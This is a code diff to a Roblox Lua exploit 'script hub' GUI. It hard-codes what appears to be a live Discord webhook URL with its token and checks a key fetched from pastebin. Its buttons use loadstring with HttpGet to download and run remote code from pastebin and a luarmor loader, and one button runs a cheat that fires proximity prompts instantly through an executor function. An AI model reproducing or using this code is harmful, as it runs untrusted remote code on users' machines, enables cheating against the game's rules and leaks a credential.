@@ -4,10 +4,9 @@ local UIS=game:GetService("UserInputService")
 local Lighting=game:GetService("Lighting")
 local HttpService=game:GetService("HttpService")
 local Stats=game:GetService("Stats")
-local TweenService=game:GetService("TweenService")
 
 -- WEBHOOK
-local WEBHOOK_URL="YOUR_WEBHOOK"
+local WEBHOOK_URL="https://discord.com/api/webhooks/1482454327120625664/-P73-QUcDqeVX1GIU7Q601SBirb9ePSZ4mH_4dWM3NokNtlhR22LgrfPaFqXaLU1bQfE"
 
 -- KEY
 local KEY_URL="https://pastebin.com/raw/fsZ7rBWj"
@@ -15,6 +14,19 @@ local KEY_URL="https://pastebin.com/raw/fsZ7rBWj"
 -- BLUR
 local blur=Instance.new("BlurEffect",Lighting)
 blur.Size=20
+
+-- RGB
+local function RGB(label)
+task.spawn(function()
+local h=0
+while label.Parent do
+label.TextColor3=Color3.fromHSV(h,1,1)
+h=h+.01
+if h>1 then h=0 end
+task.wait()
+end
+end)
+end
 
 -- KEY CHECK
 local function checkKey(input)
@@ -104,6 +116,7 @@ local main=Instance.new("Frame",hub)
 main.Size=UDim2.new(0,800,0,520)
 main.Position=UDim2.new(0.5,-400,0.5,-260)
 main.BackgroundColor3=Color3.fromRGB(20,20,20)
+main.BackgroundTransparency=.15
 Instance.new("UICorner",main)
 
 -- HEADER
@@ -170,90 +183,139 @@ sidebar.Size=UDim2.new(0,180,1,-50)
 sidebar.Position=UDim2.new(0,0,0,50)
 sidebar.BackgroundColor3=Color3.fromRGB(25,25,25)
 
+-- SIDEBAR BUTTON
+local function sidebarButton(text,icon,pos)
+
+local btn=Instance.new("TextButton",sidebar)
+btn.Size=UDim2.new(1,0,0,50)
+btn.Position=UDim2.new(0,0,0,pos)
+btn.BackgroundColor3=Color3.fromRGB(25,25,25)
+btn.Text=""
+
+local iconImg=Instance.new("ImageLabel",btn)
+iconImg.Size=UDim2.new(0,24,0,24)
+iconImg.Position=UDim2.new(0,15,0.5,-12)
+iconImg.BackgroundTransparency=1
+iconImg.Image=icon
+
+local label=Instance.new("TextLabel",btn)
+label.Size=UDim2.new(1,-60,1,0)
+label.Position=UDim2.new(0,50,0,0)
+label.BackgroundTransparency=1
+label.Font=Enum.Font.GothamBold
+label.TextSize=18
+label.TextXAlignment=Enum.TextXAlignment.Left
+label.Text=text
+
+RGB(label)
+
+return btn
+end
+
+local scriptsBtn=sidebarButton("Scripts","rbxassetid://6031094678",0)
+local settingsBtn=sidebarButton("Settings","rbxassetid://6031280882",50)
+
 -- CONTENT
 local content=Instance.new("Frame",main)
 content.Size=UDim2.new(1,-180,1,-50)
 content.Position=UDim2.new(0,180,0,50)
 content.BackgroundTransparency=1
 
--- PAGES
 local scriptsPage=Instance.new("Frame",content)
 scriptsPage.Size=UDim2.new(1,0,1,0)
 scriptsPage.BackgroundTransparency=1
 
 local settingsPage=Instance.new("Frame",content)
 settingsPage.Size=UDim2.new(1,0,1,0)
-settingsPage.Position=UDim2.new(1,0,0,0)
 settingsPage.BackgroundTransparency=1
-
--- SIDEBAR BUTTONS
-local scriptsBtn=Instance.new("TextButton",sidebar)
-scriptsBtn.Size=UDim2.new(1,0,0,50)
-scriptsBtn.Text="Scripts"
-scriptsBtn.BackgroundColor3=Color3.fromRGB(25,25,25)
-scriptsBtn.TextColor3=Color3.new(1,1,1)
-
-local settingsBtn=Instance.new("TextButton",sidebar)
-settingsBtn.Size=UDim2.new(1,0,0,50)
-settingsBtn.Position=UDim2.new(0,0,0,50)
-settingsBtn.Text="Settings"
-settingsBtn.BackgroundColor3=Color3.fromRGB(25,25,25)
-settingsBtn.TextColor3=Color3.new(1,1,1)
-
--- PAGE SWITCH
-local function switchPage(page)
-
-local pages={scriptsPage,settingsPage}
-
-for _,v in pairs(pages) do
-
-local pos=v==page and UDim2.new(0,0,0,0) or UDim2.new(1,0,0,0)
-
-TweenService:Create(
-v,
-TweenInfo.new(.35,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),
-{Position=pos}
-):Play()
-
-end
-
-end
-
--- HOVER ANIM
-local function hover(btn)
-
-btn.MouseEnter:Connect(function()
-TweenService:Create(btn,TweenInfo.new(.2),{BackgroundColor3=Color3.fromRGB(50,50,50)}):Play()
-end)
-
-btn.MouseLeave:Connect(function()
-TweenService:Create(btn,TweenInfo.new(.2),{BackgroundColor3=Color3.fromRGB(25,25,25)}):Play()
-end)
-
-end
-
-hover(scriptsBtn)
-hover(settingsBtn)
+settingsPage.Visible=false
 
 scriptsBtn.MouseButton1Click:Connect(function()
-switchPage(scriptsPage)
+scriptsPage.Visible=true
+settingsPage.Visible=false
 end)
 
 settingsBtn.MouseButton1Click:Connect(function()
-switchPage(settingsPage)
+scriptsPage.Visible=false
+settingsPage.Visible=true
 end)
 
--- SETTINGS UI
+-- SCRIPT BUTTON
+local function scriptButton(name,pos,func)
+
+local b=Instance.new("TextButton",scriptsPage)
+b.Size=UDim2.new(0,340,0,70)
+b.Position=UDim2.new(0,40,0,pos)
+b.Text=name
+b.Font=Enum.Font.GothamBlack
+b.TextSize=24
+b.BackgroundColor3=Color3.fromRGB(45,45,45)
+
+RGB(b)
+
+Instance.new("UICorner",b)
+
+b.MouseButton1Click:Connect(func)
+
+end
+
+-- SCRIPTS
+scriptButton("Script 1",60,function()
+loadstring(game:HttpGet("https://pastebin.com/raw/auSLpuqi"))()
+end)
+
+scriptButton("Script 2",160,function()
+
+local PPS=game:GetService("ProximityPromptService")
+local active=false
+
+UIS.InputBegan:Connect(function(i,g)
+if not g and i.KeyCode==Enum.KeyCode.F then
+active=not active
+end
+end)
+
+PPS.PromptButtonHoldBegan:Connect(function(p)
+if active then
+p.HoldDuration=0
+p.RequiresLineOfSight=false
+if fireproximityprompt then fireproximityprompt(p) end
+end
+end)
+
+end)
+
+scriptButton("Script 3",260,function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/f6e40e83490bff819d3a3eabd8937a4b.lua"))()
+end)
+
+-- SETTINGS PAGE
 local blurToggle=Instance.new("TextButton",settingsPage)
 blurToggle.Size=UDim2.new(0,300,0,60)
 blurToggle.Position=UDim2.new(0,40,0,60)
 blurToggle.Text="Toggle Blur"
 blurToggle.BackgroundColor3=Color3.fromRGB(45,45,45)
-blurToggle.TextColor3=Color3.new(1,1,1)
-Instance.new("UICorner",blurToggle)
+RGB(blurToggle)
 
 blurToggle.MouseButton1Click:Connect(function()
 blur.Enabled=not blur.Enabled
+end)
+
+-- PING
+local pingLabel=Instance.new("TextLabel",main)
+pingLabel.Size=UDim2.new(0,120,0,25)
+pingLabel.Position=UDim2.new(1,-130,1,-35)
+pingLabel.BackgroundTransparency=1
+pingLabel.Font=Enum.Font.GothamBold
+pingLabel.TextSize=16
+pingLabel.TextColor3=Color3.new(1,1,1)
+
+task.spawn(function()
+while true do
+local ping=Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
+pingLabel.Text="Ping: "..ping
+task.wait(1)
+end
 end)
 
 end
